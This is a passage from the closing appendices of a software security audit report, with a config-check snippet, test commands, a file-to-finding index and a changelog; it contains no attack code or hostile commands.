os.environ["JWT_SECRET_KEY"] = "change-me-to-a-random-64-char-string"
from app.config import Settings, InsecureConfigurationError
try:
    Settings(); print("FAIL: placeholder accepted")
except InsecureConfigurationError as e:
    print("OK: rejected ->", str(e).splitlines()[0])
PY
```

### C.7 Test suite

```bash
.venv/bin/python -m pytest unit_tests -q     # 354 passed at time of audit
.venv/bin/python -m pytest -q                # requires Postgres on 127.0.0.1:5433
```

---

## Appendix D — File reference index

Files examined, with the findings anchored to each.

### Backend — core

| File | Findings |
|---|---|
| `app/main.py` | [KUB-L08](#kub-l08), [KUB-L18](#kub-l18); §5.3 |
| `app/auth.py` | [KUB-001](#kub-001), [KUB-005](#kub-005), [KUB-018](#kub-018), [KUB-L01](#kub-l01) |
| `app/config.py` | §5.11 clean; [KUB-014](#kub-014) (proposed addition) |
| `app/database.py` | [KUB-L16](#kub-l16) |
| `app/encryption.py` | §5.9 clean |
| `app/rate_limit.py` | [KUB-003](#kub-003), [KUB-014](#kub-014) |
| `app/access_modules.py` | [KUB-001](#kub-001) |
| `app/worker.py` | [KUB-015](#kub-015), [KUB-L21](#kub-l21) |

### Backend — routers

| File | Findings |
|---|---|
| `app/routers/auth.py` | [KUB-002](#kub-002), [KUB-003](#kub-003), [KUB-005](#kub-005), [KUB-012](#kub-012), [KUB-L01](#kub-l01), [KUB-L06](#kub-l06) |
| `app/routers/users.py` | [KUB-004](#kub-004), [KUB-005](#kub-005), [KUB-018](#kub-018), [KUB-L10](#kub-l10), [KUB-L11](#kub-l11) |
| `app/routers/docvault.py` | [KUB-001](#kub-001), [KUB-007](#kub-007), [KUB-009](#kub-009), [KUB-010](#kub-010), [KUB-L05](#kub-l05), [KUB-L11](#kub-l11), [KUB-L12](#kub-l12), [KUB-L19](#kub-l19) |
| `app/routers/auditease.py` | [KUB-001](#kub-001), [KUB-002](#kub-002); §5.6, §5.8 |
| `app/routers/auditor_engagements.py` | [KUB-002](#kub-002), [KUB-010](#kub-010); §5.8 clean |
| `app/routers/asset_documents.py` | [KUB-009](#kub-009), [KUB-010](#kub-010) |
| `app/routers/company_smtp.py` | [KUB-006](#kub-006) |
| `app/routers/company.py` | [KUB-L09](#kub-l09) |
| `app/routers/depreciation.py` | [KUB-008](#kub-008), [KUB-019](#kub-019) |
| `app/routers/financial_years.py` | [KUB-008](#kub-008), [KUB-019](#kub-019) |
| `app/routers/leads.py` | [KUB-012](#kub-012), [KUB-L07](#kub-l07) |
| `app/routers/activity.py` | [KUB-001](#kub-001), [KUB-L02](#kub-l02), [KUB-L13](#kub-l13) |
| `app/routers/notifications.py` | [KUB-001](#kub-001); §5.8 false positive |
| `app/routers/compliance.py` | reference implementation for [KUB-001](#kub-001) |
| `app/routers/sales.py`, `kra.py` | [KUB-001](#kub-001), [KUB-011](#kub-011) |
| `app/routers/assets.py`, `asset_masters.py`, `asset_acquisitions.py`, `asset_reports.py` | §5.8 clean; [KUB-011](#kub-011) |
| `app/routers/health.py` | §5.12 |
| `app/routers/custom_fields.py` | clean (admin-gated) |

### Backend — services, models, schemas

| File | Findings |
|---|---|
| `app/services/user_security.py` | [KUB-004](#kub-004), [KUB-009](#kub-009) |
| `app/services/document_access.py` | [KUB-002](#kub-002), [KUB-013](#kub-013) |
| `app/services/auditor_access.py` | [KUB-002](#kub-002) |
| `app/services/account_admin.py` | [KUB-002](#kub-002), [KUB-004](#kub-004), [KUB-005](#kub-005); §6.4 commended |
| `app/services/export_service.py` | [KUB-011](#kub-011) |
| `app/services/import_service.py` | [KUB-L03](#kub-l03), [KUB-L04](#kub-l04) |
| `app/services/reporting/pdf.py` + templates | §5.4, §5.5 clean |
| `app/services/email/client.py` | [KUB-006](#kub-006); §5.6 |
| `app/services/email/resolver.py` | [KUB-006](#kub-006) |
| `app/services/email/tasks.py` | [KUB-L14](#kub-l14), [KUB-L21](#kub-l21) |
| `app/models/company.py` | [KUB-017](#kub-017), [KUB-018](#kub-018) |
| `app/models/auditor.py` | [KUB-002](#kub-002), [KUB-005](#kub-005) |
| `app/models/docvault.py` | [KUB-007](#kub-007), [KUB-013](#kub-013) |
| `app/schemas/auth.py` | [KUB-004](#kub-004) |
| `app/schemas/users.py` | [KUB-004](#kub-004) |
| `app/schemas/docvault.py` | [KUB-007](#kub-007) |
| `app/schemas/company_smtp.py` | [KUB-006](#kub-006) |

### Infrastructure

| File | Findings |
|---|---|
| `Dockerfile` | §5.10 clean; [KUB-L15](#kub-l15) |
| `docker-compose.yml` | [KUB-014](#kub-014), [KUB-015](#kub-015), [KUB-017](#kub-017), [KUB-L15](#kub-l15), [KUB-L16](#kub-l16); §5.10 largely clean |
| `docker-compose.override.yml.example` | clean; correctly gitignored |
| `.dockerignore` / `.gitignore` | §5.10 clean |
| `Caddyfile` | [KUB-014](#kub-014), [KUB-L17](#kub-l17); §6.3 |
| `gateway/nginx.conf`, `gateway/modes/app.conf` | [KUB-003](#kub-003), [KUB-012](#kub-012); §5.12 |
| `gateway/modes/maintenance.conf` | clean |
| `frontend/nginx.conf` | [KUB-014](#kub-014) |
| `alembic/env.py` | [KUB-017](#kub-017) |
| `alembic/versions/cd98ce56a9c3_*.py` | [KUB-017](#kub-017), [KUB-018](#kub-018) |
| `alembic/versions/a1f2b3c4d5e6_*.py` | [KUB-017](#kub-017) |
| `ops/kubera-export.sh` / `import.sh` / `migrate.sh` | [KUB-016](#kub-016) |
| `ops/lib.sh` | [KUB-L20](#kub-l20) |
| `ops/kubera-rotate-root-kek.py` | §5.1, §5.9 clean |
| `maintenance.py`, `maintenance/` | clean — `subprocess.run` with argument lists, no `shell=True` |

### Frontend

| File | Findings |
|---|---|
| `frontend/src/auth/tokenStorage.ts` | [KUB-005](#kub-005); §6.1 |
| `frontend/src/api/http.ts` | [KUB-005](#kub-005); §5.3 |
| `frontend/src/auth/company/ModuleGuard.tsx` | [KUB-001](#kub-001) |
| `frontend/src/auth/company/AdminGuard.tsx` | client-side only, matches server `require_admin` |
| `frontend/src/auth/company/modules.ts` | [KUB-001](#kub-001), [KUB-019](#kub-019) |
| `frontend/src/pages/owner/OwnerLeadsPage.tsx` | [KUB-012](#kub-012) |
| `frontend/src/pages/company/auditease/ReportsTab.tsx` | §5.4 clean (fragile) |
| `frontend/src/pages/company/assets/AssetPhoto.tsx` | [KUB-009](#kub-009) — the mitigating consumer |
| `frontend/src/lib/download.ts` | clean (`a.download` forces save) |
| `frontend/src/routes/company.routes.tsx` | [KUB-001](#kub-001) |

---

## Appendix E — Changelog for this document

| Date | Change |
|---|---|
| 2026-09-01 | Initial audit. 2 Critical, 6 High, 11 Medium, 21 Low. |

When a finding is fixed, update its status line rather than deleting it, and add
the commit reference — the reasoning is worth keeping alongside the code that
embodies it, in the same spirit as `SECURITY_HARDENING.md`.

Suggested status vocabulary: `OPEN`, `IN PROGRESS`, `FIXED (<commit>)`,
`ACCEPTED RISK (<rationale>, <date>, <who>)`, `NOT APPLICABLE (<why>)`.

---

*End of report.*
